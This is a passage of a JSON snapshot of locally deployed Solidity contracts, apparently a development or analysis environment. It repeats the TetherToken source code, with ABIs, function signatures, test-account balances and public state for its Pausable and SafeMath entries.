address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be 